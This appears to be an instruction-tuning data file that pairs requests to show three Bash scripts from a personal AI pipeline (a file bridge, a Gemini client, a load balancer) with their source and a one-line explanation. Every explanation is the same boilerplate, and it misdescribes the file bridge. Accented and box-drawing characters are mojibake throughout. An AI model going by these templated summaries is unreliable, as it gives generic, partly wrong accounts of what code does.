{"instruction": "Show me the code for bridge.sh which is part of the corleone project.", "input": "", "output": "Here's the code for `pipeline\\corleone\\bridge.sh`:\n\n```sh\n#!/bin/bash\n# CORLEONE Bridge - SincronizaciÃ³n VM â†” Windows (Antigravity)\n#\n# VM Ubuntu:    192.168.192.128\n# Host Windows: 192.168.192.2 (gateway)\n\nset -e\n\nSCRIPT_DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" && pwd)\"\nsource \"$SCRIPT_DIR/config.env\" 2>/dev/null || true\n\n# ConfiguraciÃ³n del Bridge\nVM_IP=\"192.168.192.128\"\nHOST_IP=\"${HOST_IP:-192.168.192.2}\"\nBRIDGE_PORT=\"${BRIDGE_PORT:-8765}\"\nCORLEONE_DIR=\"/home/patricio/pipeline/corleone\"\n\n# Colores\nGREEN='\\033[0;32m'\nYELLOW='\\033[1;33m'\nCYAN='\\033[0;36m'\nNC='\\033[0m'\n\nlog() { echo -e \"${GREEN}[BRIDGE]${NC} $1\"; }\ninfo() { echo -e \"${CYAN}[INFO]${NC} $1\"; }\n\n# Iniciar servidor HTTP para compartir archivos\nstart_server() {\n    log \"Iniciando servidor de archivos...\"\n    info \"Accede desde Windows: http://$VM_IP:$BRIDGE_PORT\"\n    info \"Directorio: $CORLEONE_DIR\"\n    echo \"\"\n    cd \"$CORLEONE_DIR\"\n    python3 -m http.server \"$BRIDGE_PORT\" --bind 0.0.0.0\n}\n\n# Enviar archivo a Windows (requiere carpeta compartida o servidor en Windows)\nsend_to_antigravity() {\n    local file=\"$1\"\n    local dest=\"${2:-/antigravity/inbox}\"\n\n    if [[ ! -f \"$file\" ]]; then\n        echo \"Error: Archivo no encontrado: $file\"\n        exit 1\n    fi\n\n    log \"Enviando a Antigravity: $file\"\n    # Usar curl para enviar via HTTP POST (si Antigravity tiene endpoint)\n    # O copiar a carpeta compartida\n\n    # OpciÃ³n 1: Copiar via SCP (si SSH estÃ¡ habilitado en Windows)\n    # scp \"$file\" user@$HOST_IP:\"$dest\"\n\n    # OpciÃ³n 2: Guardar en carpeta de salida para sync manual\n    cp \"$file\" \"$CORLEONE_DIR/outputs/\"\n    info \"Archivo listo en: $CORLEONE_DIR/outputs/$(basename \"$file\")\"\n    info \"Descarga desde Windows: http://$VM_IP:$BRIDGE_PORT/outputs/$(basename \"$file\")\"\n}\n\n# Recibir archivo de Windows\nreceive_from_antigravity() {\n    local url=\"$1\"\n    local dest=\"${2:-$CORLEONE_DIR/data}\"\n\n    log \"Descargando de Antigravity: $url\"\n    curl -s -o \"$dest/$(basename \"$url\")\" \"$url\"\n    info \"Guardado en: $dest/$(basename \"$url\")\"\n}\n\n# Mostrar estado del bridge\nstatus() {\n    echo \"â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\"\n    echo \"â•‘          CORLEONE â†” ANTIGRAVITY BRIDGE            â•‘\"\n    echo \"â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\"\n    echo \"\"\n    echo \"  VM Ubuntu:     $VM_IP\"\n    echo \"  Host Windows:  $HOST_IP\"\n    echo \"  Puerto:        $BRIDGE_PORT\"\n    echo \"\"\n    echo \"  Desde Windows accede a:\"\n    echo \"    http://$VM_IP:$BRIDGE_PORT/data/      â†’ Datos\"\n    echo \"    http://$VM_IP:$BRIDGE_PORT/outputs/   â†’ Resultados\"\n    echo \"    http://$VM_IP:$BRIDGE_PORT/prompts/   â†’ Prompts\"\n    echo \"\"\n}\n\n# Main\ncase \"$1\" in\n    start|server)\n        start_server\n        ;;\n    send)\n        send_to_antigravity \"$2\" \"$3\"\n        ;;\n    receive|get)\n        receive_from_antigravity \"$2\" \"$3\"\n        ;;\n    status)\n        status\n        ;;\n    *)\n        echo \"â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\"\n        echo \"â•‘     CORLEONE Bridge - Comandos        â•‘\"\n        echo \"â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\"\n        echo \"\"\n        echo \"  $0 start              Iniciar servidor\"\n        echo \"  $0 status             Ver configuraciÃ³n\"\n        echo \"  $0 send <archivo>     Enviar a Antigravity\"\n        echo \"  $0 receive <url>      Recibir de Windows\"\n        echo \"\"\n        ;;\nesac\n\n```"}
{"instruction": "What does the file bridge.sh do?", "input": "```sh\n#!/bin/bash\n# CORLEONE Bridge - SincronizaciÃ³n VM â†” Windows (Antigravity)\n#\n# VM Ubuntu:    192.168.192.128\n# Host Windows: 192.168.192.2 (gateway)\n\nset -e\n\nSCRIPT_DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" && pwd)\"\nsource \"$SCRIPT_DIR/config.env\" 2>/dev/null || true\n\n# ConfiguraciÃ³n del Bridge\nVM_IP=\"192.168.192.128\"\nHOST_IP=\"${HOST_IP:-192.168.192.2}\"\nBRIDGE_PORT=\"${BRIDGE_PORT:-8765}\"\nCORLEONE_DIR=\"/home/patricio/pipeline/corleone\"\n\n# Colores\nGREEN='\\033[0;32m'\nYELLOW='\\033[1;33m'\nCYAN='\\033[0;36m'\nNC='\\033[0m'\n\nlog() { echo -e \"${GREEN}[BRIDGE]${NC} $1\"; }\ninfo() { echo -e \"${CYAN}[INFO]${NC} $1\"; }\n\n# Iniciar servidor HTTP para compartir archivos\nstart_server() {\n    log \"Iniciando servidor de archivos...\"\n    info \"Accede desde Windows: http://$VM_IP:$BRIDGE_PORT\"\n    info \"Directorio: $CORLEONE_DIR\"\n    echo \"\"\n    cd \"$CORLEONE_DIR\"\n    python3 -m http.server \"$BRIDGE_PORT\" --bind 0.0.0.0\n}\n\n# Enviar archivo a Windows (requiere carpeta compartida o servidor en Windows)\nsend_to_antigravity() {\n    local file=\"$1\"\n    local dest=\"${2:-/antigravity/inbox}\"\n\n    if [[ ! -f \"$file\" ]]; then\n        echo \"Error: Archivo no encontrado: $file\"\n        exit 1\n    fi\n\n    log \"Enviando a Antigravity: $file\"\n    # Usar curl para enviar via HTTP POST (si Antigravity tiene endpoint)\n    # O copiar a carpeta compartida\n\n    # OpciÃ³n 1: Copiar via SCP (si SSH estÃ¡ habilitado en Windows)\n    # scp \"$file\" user@$HOST_IP:\"$dest\"\n\n    # OpciÃ³n 2: Guardar en carpeta de salida para sync manual\n    cp \"$file\" \"$CORLEONE_DIR/outputs/\"\n    info \"Archivo listo en: $CORLEONE_DIR/outputs/$(basename \"$file\")\"\n    info \"Descarga desde Windows: http://$VM_IP:$BRIDGE_PORT/outputs/$(basename \"$file\")\"\n}\n\n# Recibir archivo de Windows\nreceive_from_antigravity() {\n    local url=\"$1\"\n    local dest=\"${2:-$CORLEONE_DIR/data}\"\n\n    log \"Descargando de Antigravity: $url\"\n    curl -s -o \"$dest/$(basename \"$url\")\" \"$url\"\n    info \"Guardado en: $dest/$(basename \"$url\")\"\n}\n\n# Mostrar estado del bridg\n```", "output": "This file `bridge.sh` is part of the corleone project. Based on the code structure, it appears to handle API endpoints and request handling."}
{"instruction": "Show me the code for gemini.sh which is part of the corleone project.", "input": "", "output": "Here's the code for `pipeline\\corleone\\gemini.sh`:\n\n```sh\n#!/bin/bash\n# CORLEONE - Cliente Gemini con API Key\n# Uso: ./gemini.sh \"prompt\" [modelo]\n\nset -e\n\nSCRIPT_DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" && pwd)\"\nsource \"$SCRIPT_DIR/config.env\" 2>/dev/null || true\nsource \"$SCRIPT_DIR/../config.env\" 2>/dev/null || true\n\n# Verificar API Key\nif [[ -z \"$GEMINI_API_KEY\" ]]; then\n    echo \"â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\"\n    echo \"  CORLEONE necesita API Key de Gemini\"\n    echo \"â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\"\n    echo \"\"\n    echo \"1. Ve a: https://aistudio.google.com/app/apikey\"\n    echo \"2. Crea una API key\"\n    echo \"3. AgrÃ©gala a: $SCRIPT_DIR/config.env\"\n    echo \"   export GEMINI_API_KEY=\\\"tu-key-aqui\\\"\"\n    echo \"\"\n    exit 1\nfi\n\ncall_gemini() {\n    local prompt=\"$1\"\n    local model=\"${2:-$DEFAULT_MODEL}\"\n\n    local endpoint=\"https://generativelanguage.googleapis.com/v1beta/models/${model}:generateContent?key=${GEMINI_API_KEY}\"\n\n    local response=$(curl -s -X POST \"$endpoint\" \\\n        -H \"Content-Type: application/json\" \\\n        -d \"{\n            \\\"contents\\\": [{\n                \\\"parts\\\": [{\\\"text\\\": \\\"$prompt\\\"}]\n            }],\n            \\\"generationConfig\\\": {\n                \\\"temperature\\\": 0.7,\n                \\\"maxOutputTokens\\\": 2048\n            }\n        }\" 2>/dev/null)\n\n    echo \"$response\" | python3 -c \"\nimport sys, json\ntry:\n    data = json.load(sys.stdin)\n    if 'candidates' in data:\n        print(data['candidates'][0]['content']['parts'][0]['text'])\n    elif 'error' in data:\n        print('ERROR:', data['error'].get('message', data['error']))\n    else:\n        print(json.dumps(data, indent=2))\nexcept:\n    pass\n\" 2>/dev/null || echo \"$response\"\n}\n\n# Main\nprompt=\"$1\"\nmodel=\"${2:-$DEFAULT_MODEL}\"\n\nif [[ -z \"$prompt\" ]]; then\n    echo \"â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\"\n    echo \"â•‘       CORLEONE - Gemini Client        â•‘\"\n    echo \"â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\"\n    echo \"\"\n    echo \"Uso: $0 \\\"prompt\\\" [modelo]\"\n    echo \"\"\n    echo \"Modelos:\"\n    echo \"  gemini-1.5-flash  (default, barato)\"\n    echo \"  gemini-1.5-pro    (premium)\"\n    exit 0\nfi\n\necho \"[CORLEONE] $model\" >&2\ncall_gemini \"$prompt\" \"$model\"\n\n```"}
{"instruction": "What does the file gemini.sh do?", "input": "```sh\n#!/bin/bash\n# CORLEONE - Cliente Gemini con API Key\n# Uso: ./gemini.sh \"prompt\" [modelo]\n\nset -e\n\nSCRIPT_DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" && pwd)\"\nsource \"$SCRIPT_DIR/config.env\" 2>/dev/null || true\nsource \"$SCRIPT_DIR/../config.env\" 2>/dev/null || true\n\n# Verificar API Key\nif [[ -z \"$GEMINI_API_KEY\" ]]; then\n    echo \"â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\"\n    echo \"  CORLEONE necesita API Key de Gemini\"\n    echo \"â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\"\n    echo \"\"\n    echo \"1. Ve a: https://aistudio.google.com/app/apikey\"\n    echo \"2. Crea una API key\"\n    echo \"3. AgrÃ©gala a: $SCRIPT_DIR/config.env\"\n    echo \"   export GEMINI_API_KEY=\\\"tu-key-aqui\\\"\"\n    echo \"\"\n    exit 1\nfi\n\ncall_gemini() {\n    local prompt=\"$1\"\n    local model=\"${2:-$DEFAULT_MODEL}\"\n\n    local endpoint=\"https://generativelanguage.googleapis.com/v1beta/models/${model}:generateContent?key=${GEMINI_API_KEY}\"\n\n    local response=$(curl -s -X POST \"$endpoint\" \\\n        -H \"Content-Type: application/json\" \\\n        -d \"{\n            \\\"contents\\\": [{\n                \\\"parts\\\": [{\\\"text\\\": \\\"$prompt\\\"}]\n            }],\n            \\\"generationConfig\\\": {\n                \\\"temperature\\\": 0.7,\n                \\\"maxOutputTokens\\\": 2048\n            }\n        }\" 2>/dev/null)\n\n    echo \"$response\" | python3 -c \"\nimport sys, json\ntry:\n    data = json.load(sys.stdin)\n    if 'candidates' in data:\n        print(data['candidates'][0]['content']['parts'][0]['text'])\n    elif 'error' in data:\n        print('ERROR:', data['error'].get('message', data['error']))\n    else:\n        print(json.dumps(data, indent=2))\nexcept:\n    pass\n\" 2>/dev/null || echo \"$response\"\n}\n\n# Main\nprompt=\"$1\"\nmodel=\"${2:-$DEFAULT_MODEL}\"\n\nif [[ -z \"$prompt\" ]]; then\n    echo \"â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\"\n    echo \"â•‘       CORLEONE - Gemini Client        â•‘\"\n    echo \"â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\"\n    echo \"\"\n    echo \"Uso: $0 \\\"prompt\\\" [modelo]\"\n    echo \"\"\n    echo \"Modelos:\"\n\n```", "output": "This file `gemini.sh` is part of the corleone project. Based on the code structure, it appears to handle API endpoints and request handling."}
{"instruction": "Show me the code for balancer.sh which is part of the lb project.", "input": "", "output": "Here's the code for `pipeline\\lb\\balancer.sh`:\n\n```sh\n#!/bin/bash\n# â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\n# â•‘  LOAD BALANCER - DistribuciÃ³n de cÃ³mputo AI                   â•‘\n# â•‘  PROPIEDAD INTELECTUAL: PATRICIO MIGUEL MARTIN MENDEZ         â•‘\n# â•‘  Todos los derechos reservados Â© 2024-2026                    â•‘\n# â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\nset -e\n\nSCRIPT_DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" && pwd)\"\nPIPELINE_DIR=\"$(dirname \"$SCRIPT_DIR\")\"\nsource \"$PIPELINE_DIR/config.env\" 2>/dev/null || true\n\n# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n# ENDPOINTS\n# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\nLM_STUDIO_URL=\"${LM_STUDIO_URL:-http://192.168.192.2:1234/v1}\"\nGEMINI_URL=\"https://generativelanguage.googleapis.com/v1beta\"\n\n# Estado de backends\ndeclare -A BACKEND_STATUS\nBACKEND_STATUS[lmstudio]=\"unknown\"\nBACKEND_STATUS[gemini]=\"unknown\"\n\n# Cola de overflow\nQUEUE_DIR=\"$SCRIPT_DIR/queue\"\nmkdir -p \"$QUEUE_DIR\"\n\n# Audit log\naudit() {\n    \"$PIPELINE_DIR/logs/audit.sh\" log \"$1\" \"$2\" \"balancer\" \"$3\" 2>/dev/null || true\n}\n\n# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n# HEALTH CHECK\n# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\ncheck_lmstudio() {\n    local response=$(curl -s --connect-timeout 3 \"$LM_STUDIO_URL/models\" 2>/dev/null)\n    if [[ -n \"$response\" && \"$response\" != *\"error\"* ]]; then\n        BACKEND_STATUS[lmstudio]=\"healthy\"\n        return 0\n    fi\n    BACKEND_STATUS[lmstudio]=\"down\"\n    return 1\n}\n\ncheck_gemini() {\n    # Gemini requiere auth, solo verificamos conectividad\n    if curl -s --connect-timeout 3 \"https://generativelanguage.googleapis.com\" >/dev/null 2>&1; then\n        BACKEND_STATUS[gemini]=\"available\"\n        return 0\n    fi\n    BACKEND_STATUS[gemini]=\"down\"\n    return 1\n}\n\nhealth_check() {\n    echo \"Verificando backends...\"\n    check_lmstudio && echo \"  LM Studio: âœ… healthy\" || echo \"  LM Studio: âŒ down\"\n    check_gemini && echo \"  Gemini:    âœ… available\" || echo \"  Gemini:    âŒ down\"\n}\n\n# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n# ROUTING\n# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\nroute_request() {\n    local prompt=\"$1\"\n    local priority=\"${2:-normal}\"  # normal, high, local-only, cloud-only\n\n    audit \"route_request\" \"priority=$priority\" \"pending\"\n\n    # Estrategia de routing\n    case \"$priority\" in\n        local-only)\n            if check_lmstudio; then\n                call_lmstudio \"$prompt\"\n                return $?\n            else\n                echo \"ERROR: LM Studio no disponible\"\n                return 1\n            fi\n            ;;\n        cloud-only)\n            call_gemini \"$prompt\"\n            return $?\n            ;;\n        high)\n            # Intentar local primero, fallback a cloud\n            if check_lmstudio; then\n                call_lmstudio \"$prompt\"\n            else\n                call_gemini \"$prompt\"\n            fi\n            ;;\n        *)\n            # Normal: local si disponible, sino cloud\n            if check_lmstudio; then\n                call_lmstudio \"$prompt\"\n            elif check_gemini; then\n                call_gemini \"$prompt\"\n            else\n                # Overflow: encolar\n                queue_request \"$prompt\"\n                echo \"Request encolado (backends no disponibles)\"\n                return 2\n            fi\n            ;;\n    esac\n}\n\n# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n# BACKEND CALLS\n# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\ncall_lmstudio() {\n    local prompt=\"$1\"\n\n    audit \"call_lmstudio\" \"prompt_length=${#prompt}\" \"pending\"\n\n    local response=$(curl -s \"$LM_STUDIO_URL/chat/completions\" \\\n        -H \"Content-Type: application/json\" \\\n        -d \"{\n            \\\"model\\\": \\\"local-model\\\",\n            \\\"messages\\\": [{\\\"role\\\": \\\"user\\\", \\\"content\\\": $(echo \"$prompt\" | jq -Rs .)}],\n            \\\"temperature\\\": 0.7\n        }\" 2>/dev/null)\n\n    if [[ -n \"$response\" ]]; then\n        audit \"call_lmstudio\" \"success\" \"success\"\n        echo \"$response\" | jq -r '.choices[0].message.content' 2>/dev/null || echo \"$response\"\n        return 0\n    fi\n\n    audit \"call_lmstudio\" \"failed\" \"error\"\n    return 1\n}\n\ncall_gemini() {\n    local prompt=\"$1\"\n\n    audit \"call_gemini\" \"prompt_length=${#prompt}\" \"pending\"\n\n    # Usar el cliente de Gemini existente\n    if [[ -x \"$PIPELINE_DIR/corleone/gemini.sh\" ]]; then\n        \"$PIPELINE_DIR/corleone/gemini.sh\" \"$prompt\"\n        audit \"call_gemini\" \"success\" \"success\"\n    else\n        echo \"Gemini client no disponible\"\n        audit \"call_gemini\" \"client_missing\" \"error\"\n        return 1\n    fi\n}\n\n# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n# OVERFLOW QUEUE\n# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\nqueue_request() {\n    local prompt=\"$1\"\n    local id=\"Q-$(date +%s)\"\n    local file=\"$QUEUE_DIR/${id}.json\"\n\n    cat > \"$file\" <<EOF\n{\n    \"id\": \"$id\",\n    \"timestamp\": \"$(date -Iseconds)\",\n    \"prompt\": $(echo \"$prompt\" | jq -Rs .),\n    \"status\": \"pending\"\n}\nEOF\n\n    audit \"queue_request\" \"id=$id\" \"queued\"\n    echo \"$id\"\n}\n\nprocess_queue() {\n    echo \"Procesando cola de overflow...\"\n    local processed=0\n\n    for file in \"$QUEUE_DIR\"/*.json; do\n        [[ -f \"$file\" ]] || continue\n\n        local status=$(jq -r '.status' \"$file\")\n        [[ \"$status\" == \"pending\" ]] || continue\n\n        local prompt=$(jq -r '.prompt' \"$file\")\n        local id=$(jq -r '.id' \"$file\")\n\n        echo \"Procesando: $id\"\n\n        if route_request \"$prompt\" \"normal\" >/dev/null; then\n            jq '.status = \"completed\"' \"$file\" > \"${file}.tmp\" && mv \"${file}.tmp\" \"$file\"\n            ((processed++))\n        fi\n    done\n\n    echo \"Procesados: $processed requests\"\n}\n\n# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n# STATUS\n# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\nstatus() {\n    echo \"â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\"\n    echo \"â•‘              LOAD BALANCER STATUS                         â•‘\"\n    echo \"â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\"\n    echo \"\"\n\n    health_check\n    echo \"\"\n\n    local queue_size=$(ls \"$QUEUE_DIR\"/*.json 2>/dev/null | wc -l)\n    echo \"  Queue size: $queue_size\"\n    echo \"\"\n}\n\n# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n# MAIN\n# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\ncase \"$1\" in\n    route|send)\n        route_request \"$2\" \"$3\"\n        ;;\n    health|check)\n        health_check\n        ;;\n    queue)\n        queue_request \"$2\"\n        ;;\n    process)\n        process_queue\n        ;;\n    status)\n        status\n        ;;\n    *)\n        echo \"LOAD BALANCER - AI Request Distribution\"\n        echo \"Â© PATRICIO MIGUEL MARTIN MENDEZ\"\n        echo \"\"\n        echo \"  lb route <prompt> [priority]   Enviar request\"\n        echo \"  lb health                      Check backends\"\n        echo \"  lb queue <prompt>              Encolar request\"\n        echo \"  lb process                     Procesar cola\"\n        echo \"  lb status                      Ver estado\"\n        echo \"\"\n        echo \"Prioridades: normal, high, local-only, cloud-only\"\n        ;;\nesac\n\n```"}
{"instruction": "What does the file balancer.sh do?", "input": "```sh\n#!/bin/bash\n# â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\n# â•‘  LOAD BALANCER - DistribuciÃ³n de cÃ³mputo AI                   â•‘\n# â•‘  PROPIEDAD INTELECTUAL: PATRICIO MIGUEL MARTIN MENDEZ         â•‘\n# â•‘  Todos los derechos reservados Â© 2024-2026                    â•‘\n# â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\nset -e\n\nSCRIPT_DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" && pwd)\"\nPIPELINE_DIR=\"$(dirname \"$SCRIPT_DIR\")\"\nsource \"$PIPELINE_DIR/config.env\" 2>/dev/null || true\n\n# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n# ENDPOINTS\n# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\nLM_STUDIO_URL=\"${LM_STUDIO_URL:-http://192.168.192.2:1234/v1}\"\nGEMINI_URL=\"https://generativelanguage.googleapis.com/v1beta\"\n\n# Estado de backends\ndeclare -A BACKEND_STATUS\nBACKEND_STATUS[lmstudio]=\"unknown\"\nBACKEND_STATUS[gemini]=\"unknown\"\n\n# Cola de overflow\nQUEUE_DIR=\"$SCRIPT_DIR/queue\"\nmkdir -p \"$QUEUE_DIR\"\n\n# Audit log\naudit() {\n    \"$PIPELINE_DIR/logs/audit.sh\" log \"$1\" \"$2\" \"balancer\" \"$3\" 2>/dev/null || true\n}\n\n# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n# HEALTH CHECK\n# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\ncheck_lmstudio() {\n    local response=$(curl -s --connect-timeout 3 \"$LM_STUDIO_URL/models\" 2>/dev/null)\n    if [[ -n \"$response\" && \"$response\" != *\"error\"* ]]; then\n        BACKEND_STATUS[lmstudio]=\"healthy\"\n        return 0\n    fi\n    BACKEND_STATUS[lmstudio]=\"down\"\n    return 1\n}\n\ncheck_gemini() {\n    # Gemini requiere auth, solo verificamos conectividad\n    if curl -s --connect-timeout 3 \"https://generativelanguage.googleapis.com\" >/dev/null 2>&1; then\n        BACKEND_STATUS[gemini]=\"available\"\n        return 0\n    fi\n    BACKEND_STATUS[gemini]=\"down\"\n    return 1\n}\n\nhealth_check() {\n    echo \"Verificando backends...\"\n    check_lmstudio && echo \"  LM Studio: âœ… healthy\" || echo \"  LM Studio: âŒ down\"\n    check_gemini && echo \"  Gemini:    âœ… available\" || ech\n```", "output": "This file `balancer.sh` is part of the lb project. Based on the code structure, it appears to handle API endpoints and request handling."}
